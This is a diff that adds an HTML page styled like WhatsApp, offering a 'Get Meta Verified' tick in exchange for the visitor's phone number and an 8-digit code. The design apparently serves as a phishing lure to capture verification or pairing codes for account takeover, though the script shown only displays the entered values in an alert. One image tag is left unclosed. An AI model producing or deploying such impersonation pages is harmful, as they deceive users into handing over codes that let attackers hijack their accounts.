@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Get Verified Tick</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #25D366; /* WhatsApp green background */
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh; /* Full viewport height */
+      background-image: url('https://images.app.goo.gl/scoAvQyjraeSusrE8'); /* Optional: keep the background image */
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+    }
+    .container {
+      background: #ffffff; /* White background for the main container */
+      padding: 30px 25px;
+      border-radius: 15px;
+      box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 320px;
+      max-width: 100%;
+    }
+    h2 {
+      margin-bottom: 20px;
+      color: #075e54; /* WhatsApp dark green */
+      font-weight: bold;
+    }
+    input[type="text"] {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      background-color: #f1f1f1; /* Slightly off-white background for input fields */
+    }
+    .code-input-container {
+      display: flex;
+      justify-content: space-between;
+      margin: 10px 0 20px 0;
+    }
+    .code-box {
+      width: 40px;
+      height: 40px;
+      text-align: center;
+      font-size: 24px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin: 0 5px;
+      background-color: #f1f1f1;
+      outline: none;
+    }
+    .button-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    button {
+      background-color: #25D366; /* WhatsApp's green color */
+      color: white;
+      border: none;
+      padding: 10px 18px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background-color: #128C7E; /* Darker green for hover effect */
+    }
+    .tick-icon {
+      width: 30px;
+      height: 30px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Get Meta Verified</h2>
+  
+  <input type="text" id="number" placeholder="Enter Your Number">
+  
+  <div class="code-input-container">
+    <!-- 8 individual input boxes for the 8-digit code -->
+    <input type="text" class="code-box" maxlength="1" id="digit1" oninput="moveFocus(1)">
+    <input type="text" class="code-box" maxlength="1" id="digit2" oninput="moveFocus(2)">
+    <input type="text" class="code-box" maxlength="1" id="digit3" oninput="moveFocus(3)">
+    <input type="text" class="code-box" maxlength="1" id="digit4" oninput="moveFocus(4)">
+    <input type="text" class="code-box" maxlength="1" id="digit5" oninput="moveFocus(5)">
+    <input type="text" class="code-box" maxlength="1" id="digit6" oninput="moveFocus(6)">
+    <input type="text" class="code-box" maxlength="1" id="digit7" oninput="moveFocus(7)">
+    <input type="text" class="code-box" maxlength="1" id="digit8" oninput="moveFocus(8)">
+  </div>
+
+  <div class="button-container">
+    <button onclick="getVerified()">Get Verified Tick</button>
+    <img src="https://images.app.goo.gl/sEqh6iqddtw53Gm76" 
+</div>
+
+<script>
+  function getVerified() {
+    let code = '';
+    for (let i = 1; i <= 8; i++) {
+      code += document.getElementById('digit' + i).value.trim();
+    }
+    
+    const number = document.getElementById('number').value.trim();
+    
+    if (number && code.length === 8) {
+      alert('Verification request sent!\nNumber: ' + number + '\nCode: ' + code);
+    } else {
+      alert('Please enter your number and a complete 8-digit code!');
+    }
+  }
+
+  function moveFocus(currentDigit) {
+    if (currentDigit < 8) {
+      const nextInput = document.getElementById('digit' + (currentDigit + 1));
+      if (nextInput) nextInput.focus();
+    }
+  }
+</script>
+
+</body>
+</html>
